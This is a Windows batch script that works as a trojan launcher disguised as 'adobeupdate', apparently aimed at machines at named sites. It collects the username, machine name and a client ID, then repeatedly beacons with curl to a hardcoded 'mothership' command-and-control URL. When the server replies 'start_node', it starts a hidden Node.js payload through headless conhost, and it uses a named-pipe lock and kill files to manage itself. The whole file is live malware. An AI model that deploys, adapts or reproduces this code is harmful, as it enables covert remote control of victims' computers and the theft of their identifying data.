REM ! at tpl yonge/bloor task will not run if script is still running (task scheduler doesn't kick off new task) -- pid check is not necessary
REM ! same behavior as some of the PCs at st. james -- recall that if adobeupdate 
REM   was executed outside of task scheduler and is running task will get kicked off each time

echo %random% > tpl_%random%

SET script_version=launcher_for_adobeupdate

SET "trojandir=C:\ProgramData\owd"

cd /d %trojandir%

set trojanfname=adobeupdate

title tpl_launch_%trojanfname%

set clientid=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%

IF EXIST %trojandir%\client_id (
    set /p clientid=<%trojandir%\client_id
)

set clientid=%clientid:~0,8%

IF NOT EXIST %trojandir%\client_id (
    echo %clientid% > %trojandir%\client_id
)    

echo %USERNAME% > %trojandir%\username
SET /P tusername=<%trojandir%\username
set "tusername=%tusername: =%"

IF "%tusername%"=="" (
    wmic computersystem get username | findstr /v UserName > %trojandir%\username
    set /p tusername=<%trojandir%\username
    set "tusername=%tusername:*\=%"
)

echo %COMPUTERNAME% > %trojandir%\machinename
SET /P machinename=<%trojandir%\machinename

set "machinename=%machinename: =%"

IF "%machinename%"=="" (
    wmic computersystem get name | findstr /v Name > %trojandir%\machinename
    SET /P machinename=<%trojandir%\machinename
)

set "machinename=%machinename: =%"

IF "%machinename%"=="" (

    FOR /F "tokens=2 delims=:" %%A IN ('systeminfo ^| findstr /B /C:"Host Name"') DO (
        set "myHost=%%A"
    )
    set "myHost=%myHost:~1%"

    set machinename=%myHost%
    
    echo %machinename% > %trojandir%\machinename
)

set scriptfullpath=%~f0
set source=%~nx0


REM set params=%params% --data-urlencode "sessionid=%sessionid%" 
REM set params=%params% --data-urlencode "jobcode=%jobcode%" 
REM set params=%params% --data-urlencode "batchid=%batchid%"

set params=
set params=%params% --data-urlencode "source=%source%" 
set params=%params% --data-urlencode "username=%tusername%"
set params=%params% --data-urlencode "machinename=%machinename%"
set params=%params% --data-urlencode "clientid=%clientid%"
set params=%params% --data-urlencode "script_version=%script_version%"

SET pingdelaytime=3

REM --- read/write mothership

set "mothership=https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault"

IF EXIST %trojandir%\mothership (
    SET /P mothership=<%trojandir%\mothership
)
   
set "mothership=%mothership: =%"

IF NOT EXIST %trojandir%\mothership (
    echo %mothership% > %trojandir%\mothership
)

SET nodepath=C:\ProgramData\owd\node\node-v26.4.0-win-x64\node.exe

set dt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%

SET timestamp=%dt:~0,14%%dt:~15,3%

SET "logfpath=%trojandir%\master_%source%_%timestamp%.log"

type nul > %logfpath%

echo starting [ %source% ] [ %* ]  %clientid% ] [ %timestamp% ] >> %logfpath%

set "pipeName=\\.\pipe\owd_watchdog_lock"

powershell -Command "if (Test-Path '%pipeName%') { exit 0 } else { exit 222 }"

if %errorlevel% equ 0 (
    echo [INFO] Named pipe "%pipeName%" exists -- exiting >> %logfpath%
    exit
) else (
    echo [INFO] Named pipe "%pipeName%" does not exist. -- continuing >> %logfpath%
)

wmic process get ProcessId,CommandLine /format:csv | findstr tpl_launch | findstr /v findstr >> %logfpath%

IF "%errorlevel%"=="0" (
    echo tpl_launch.cmd is running -- exiting >> %logfpath%
    exit
)

SET scriptPID=

for /f "tokens=2 delims==" %%A in ('wmic process where "name='wmic.exe' and commandline like '%%%%_%%random%%_%%%%'" get parentprocessid /value') do set "scriptPID=%%A"

echo script pid: %scriptPID% >> %logfpath%

echo %scriptPID% > %trojandir%\%source%_running

set cmdname=ping

goto %cmdname%loop

echo fatal error reached, exiting >> %logfpath%
exit 1


:pingloop
    
    
    IF EXIST %trojandir%\killall (
        echo exiting pingloop >> %logfpath%
        exit 1
    )

    IF EXIST %trojandir%\reset_pingloop (
        echo reset pingloop >> %logfpath%
        DEL /F /Q %trojandir%\reset_pingloop
        exit 1
    )
    
    SET dt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
    SET ping_timestamp=%dt:~0,14%%dt:~15,3%

    echo starting pingloop clientid %clientid% %mothership% -- %ping_timestamp% >> %logfpath%

    SET pingfname=ping_response

    type nul > %trojandir%\%pingfname%
        
    curl -v -o %trojandir%\%pingfname% -G %mothership%/ow/ping.php %params% >> %logfpath% 2>&1

    type %trojandir%\%pingfname% >> %logfpath%
    
    REM check if START_NODE present, if so launch adobeupdate
    
    type %trojandir%\%pingfname% | findstr /I start_node

    IF "%errorlevel%"=="0" (
        echo  starting node launch_ping >> %logfpath%
        wmic process call create "conhost.exe --headless %nodepath% %trojandir%\%trojanfname% launch_ping %*"
    )

    echo pingloop sleeping %pingdelaytime% >> %logfpath%
    
    timeout %pingdelaytime% /nobreak >NUL 2>&1

    set /a num=%random% %% 60 + 1

    echo pingloop sleeping for additional %num% secs >> %logfpath%

    timeout %num% /nobreak >NUL 2>&1
    
goto :pingloop

